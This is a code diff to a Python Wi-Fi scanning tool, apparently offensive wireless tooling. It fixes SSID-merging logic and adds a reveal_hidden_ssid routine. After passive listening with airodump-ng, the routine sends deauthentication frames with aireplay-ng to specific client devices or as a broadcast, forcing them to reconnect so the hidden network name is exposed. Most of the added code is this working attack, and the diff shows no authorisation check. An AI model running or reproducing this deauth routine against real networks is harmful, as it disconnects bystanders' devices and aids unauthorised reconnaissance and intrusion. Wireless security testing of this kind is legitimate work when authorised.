@@ -441,13 +441,13 @@ class WPAScanner:
                                 bssid = parts[2].strip()
                                 probed_essid = parts[5].strip().strip('"')
                                 if probed_essid and len(probed_essid) > 0:
-                                    # Aggiorna o aggiungi network con SSID rivelato
+                                    matched = False
                                     for net in networks:
                                         if net.get('BSSID') == bssid and (not net.get('ESSID') or net.get('ESSID') == ''):
                                             net['ESSID'] = probed_essid
                                             net['Hidden'] = True
-                                    else:
-                                        # Nuova rete nascosta
+                                            matched = True
+                                    if not matched:
                                         networks.append({
                                             'BSSID': bssid,
                                             'ESSID': probed_essid,
@@ -460,7 +460,6 @@ class WPAScanner:
         except:
             pass
         
-        # Marca reti con ESSID vuoto come nascoste
         for net in networks:
             if not net.get('ESSID') or net.get('ESSID') == '' or net.get('ESSID') == '(hidden)':
                 net['ESSID'] = 'Hidden'
@@ -524,6 +523,150 @@ class WPAScanner:
             return target
         except (ValueError, IndexError):
             console.print("[bold red][✗] Invalid selection[/bold red]")
+            return None
+
+    def reveal_hidden_ssid(self, bssid, timeout=30):
+        """Try to reveal a hidden SSID via passive probe listening, then active deauth"""
+        global running
+        
+        console.print(f"[cyan][*] Attempting to reveal SSID for {bssid}...[/cyan]")
+        
+        # Method 1: passive — listen for probe requests
+        console.print("[dim]Method 1: Listening for probe requests (15 seconds)...[/dim]")
+        temp_file = f"/tmp/hidden_reveal_{int(time.time())}"
+        
+        try:
+            cmd = [
+                'sudo', 'airodump-ng',
+                '--bssid', bssid,
+                '--write', temp_file,
+                '--output-format', 'csv',
+                self.monitor_interface
+            ]
+            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
+            
+            for i in range(15):
+                if not running:
+                    process.terminate()
+                    return None
+                time.sleep(1)
+            
+            process.terminate()
+            process.wait(timeout=3)
+            time.sleep(1)
+            
+            csv_file = temp_file + '-01.csv'
+            if os.path.exists(csv_file):
+                with open(csv_file, 'r') as f:
+                    lines = f.read().split('\n')
+                    in_station = False
+                    for line in lines:
+                        if 'Station MAC' in line:
+                            in_station = True
+                            continue
+                        if in_station and line.strip():
+                            parts = line.split(',')
+                            if len(parts) >= 7:
+                                station_bssid = parts[5].strip() if len(parts) > 5 else ''
+                                probed_essid = parts[6].strip() if len(parts) > 6 else ''
+                                if station_bssid == bssid and probed_essid and probed_essid != '(not specified)':
+                                    console.print("[green][✓] SSID revealed via probe request![/green]")
+                                    return probed_essid.strip('"')
+        except Exception as e:
+            console.print(f"[dim]Passive scan method error: {e}[/dim]")
+        
+        # Method 2: active — deauth clients to force re-association
+        console.print("[dim]Method 2: Sending deauth to force client revelation...[/dim]")
+        
+        try:
+            channel = self.find_ap_channel(bssid)
+            clients = self.discover_clients(bssid, channel or '1')
+            
+            if clients:
+                console.print(f"[dim]Found {len(clients)} client(s). Sending deauth...[/dim]")
+                for client in clients[:3]:
+                    client_mac = client.get('Station MAC')
+                    if not client_mac:
+                        continue
+                    console.print(f"[dim]Deauthing client {client_mac}...[/dim]")
+                    subprocess.run(
+                        ['sudo', 'aireplay-ng', '--deauth', '5', '-a', bssid, '-c', client_mac, self.monitor_interface],
+                        capture_output=True, timeout=5
+                    )
+                    time.sleep(2)
+                    
+                    temp_file2 = f"/tmp/hidden_reveal2_{int(time.time())}"
+                    cmd2 = [
+                        'sudo', 'airodump-ng', '--bssid', bssid,
+                        '--write', temp_file2, '--output-format', 'csv',
+                        '--channel', str(channel) if channel else '1',
+                        self.monitor_interface
+                    ]
+                    process2 = subprocess.Popen(cmd2, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
+                    time.sleep(5)
+                    process2.terminate()
+                    process2.wait(timeout=3)
+                    
+                    csv_file2 = temp_file2 + '-01.csv'
+                    if os.path.exists(csv_file2):
+                        with open(csv_file2, 'r') as f:
+                            for line in f:
+                                if bssid in line and ',' in line:
+                                    parts = line.split(',')
+                                    if len(parts) >= 14:
+                                        essid = parts[13].strip()
+                                        if essid:
+                                            console.print("[green][✓] SSID revealed via deauth attack![/green]")
+                                            return essid
+            else:
+                console.print("[dim]No clients found — trying broadcast deauth...[/dim]")
+                subprocess.run(
+                    ['sudo', 'aireplay-ng', '--deauth', '10', '-a', bssid, self.monitor_interface],
+                    capture_output=True, timeout=5
+                )
+                time.sleep(3)
+                temp_file3 = f"/tmp/hidden_reveal3_{int(time.time())}"
+                cmd3 = [
+                    'sudo', 'airodump-ng', '--bssid', bssid,
+                    '--write', temp_file3, '--output-format', 'csv',
+                    self.monitor_interface
+                ]
+                process3 = subprocess.Popen(cmd3, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
+                time.sleep(8)
+                process3.terminate()
+                process3.wait(timeout=3)
+                
+                csv_file3 = temp_file3 + '-01.csv'
+                if os.path.exists(csv_file3):
+                    with open(csv_file3, 'r') as f:
+                        for line in f:
+                            if bssid in line and ',' in line:
+                                parts = line.split(',')
+                                if len(parts) >= 14:
+                                    essid = parts[13].strip()
+                                    if essid:
+                                        console.print("[green][✓] SSID revealed via broadcast deauth![/green]")
+                                        return essid
+        except Exception as e:
+            console.print(f"[dim]Active method error: {e}[/dim]")
+        
+        console.print("[red][✗] Could not reveal hidden SSID[/red]")
+        return None
+
+    def find_ap_channel(self, bssid):
+        """Find the channel of an AP by BSSID"""
+        try:
+            result = subprocess.run(
+                ['sudo', 'airodump-ng', self.monitor_interface],
+                capture_output=True, text=True, timeout=10
+            )
+            for line in result.stdout.split('\n'):
+                if bssid.lower() in line.lower():
+                    channel_match = re.search(r'CH\s+(\d+)', line)
+                    if channel_match:
+                        return channel_match.group(1)
+            return None
+        except:
             return None
     
     def discover_clients(self, bssid, channel):
